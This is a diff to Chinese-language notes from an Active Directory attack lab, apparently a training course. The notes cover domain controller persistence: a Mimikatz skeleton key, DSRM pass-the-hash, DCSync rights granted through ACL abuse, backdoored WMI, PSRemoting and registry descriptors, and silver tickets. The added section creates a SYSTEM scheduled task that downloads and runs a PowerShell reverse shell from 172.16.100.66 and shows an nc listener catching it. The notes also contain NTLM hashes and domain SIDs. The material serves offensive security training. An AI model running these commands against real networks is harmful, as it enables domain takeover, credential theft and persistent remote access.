@@ -1,10 +1,11 @@
 # 制作万能钥匙
 在一台有DA权限的shell里运行下面命令
 
+所有计算机都可以使用密码：```mimikatz```访问
+
 ### 方法1
 ```
-Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.loc
-al
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
 ### 方法2(推荐)
 回到学生机器,创建一个DC的登录session
@@ -68,21 +69,68 @@ DSRM administrator不允许登陆，用之前的session进入DC修改
 ```
 
 
-现在用DSRM的原始哈希，来运行一个有DA权限的shell
+现在用DSRM的原始哈希，来运行一个有DA权限的shell,注意，这里的/domain参数指定的是dcorp-dc这台计算机，不是域的名字
 ```
 Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+```
+
+验证:
+```
+PS C:\ad> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
+
+
+    Directory: \\dcorp-dc.dollarcorp.moneycorp.local\c$
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       11/29/2019   1:32 AM                PerfLogs
+d-r---        2/16/2019   9:14 PM                Program Files
+d-----        7/16/2016   6:23 AM                Program Files (x86)
+d-r---       12/14/2019   8:23 PM                Users
+d-----        8/20/2020   2:05 AM                Windows
+```
+
+可以访问文件系统，但是不能在这台系统上执行命令。
+
+如果想要用DSRM获得一个shell，可以设置一个定时任务
+
+
+## 制作定时任务：
+```
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
+```
+
+## 触发定时任务
+```
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
+```
+
+
+获得反弹shell
+```
+PS C:\ad> .\nc.exe -lnvp 443
+listening on [any] 443 ...
+connect to [172.16.100.66] from (UNKNOWN) [172.16.2.1] 64272
+Windows PowerShell running as user DCORP-DC$ on DCORP-DC
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>whoami
+nt authority\system
+PS C:\Windows\system32> hostname
+dcorp-dc
 ```
 
 #  Dcsync 
 
 using ACLs – Rights Abuse
 
-查找当前账号是否有DCSync的权限
+查找账号student366是否有DCSync的权限（此操作需要DA权限）
 ```
 PS C:\ad> . .\PowerView.ps1
 PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
 ```
- 如果没有任何返回，表示没有权限
+如果没有任何返回，表示没有权限
 
 来到有DA权限的shell
 
@@ -95,7 +143,7 @@ Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Pr
 Add-ObjectAcl -TargetDistinguishedName"dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student366 -Rights DCSync -Verbose
 ```
 
-现在回到学生机shell，再次查看本账号是否有Dcsync权限
+再次查看本账号是否有Dcsync权限
 
 ```
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
@@ -103,7 +151,7 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 
 如果已经出现```ActiveDirectoryRights : GenericAll```表示成功赋权
 
-执行Dcsync,导出krbtgt哈希（也可以是其他用户）
+执行Dcsync,导出krbtgt哈希（也可以是其他用户,此操作需要在DA权限的shell里操作）
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
@@ -120,20 +168,20 @@ PS C:\ad> . .\RACE.ps1
 Set-RemoteWMI -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
 ```
 
-查看
+在学生shell（重启VM生效）查看
 ```
 gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
 
 ### 没有登录凭证，修改安全描述符，使得学生机可以在DC上执行命令
 
-引入RACE.ps1，域名写全
+DA shell，引入RACE.ps1，域名写全
 ```
 PS C:\ad> . .\RACE.ps1
 PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
 ```
 
-执行whoami命令
+在学生shell（重启VM生效），执行whoami命令
 ```
 Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
@@ -147,7 +195,7 @@ Modifying DC registry security descriptors for remote hash retrieval using DAMP
 Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student366 -Verbose
 ```
 
-在学生shell
+在学生shell（重启VM生效）
 引入框架
 ```
 PS C:\ad> . .\RACE.ps1
@@ -177,6 +225,7 @@ PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneyco
 Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
 ```
 
+可以建一个定时任务反弹DC这台服务器的shell
 
 # DCShadow
 
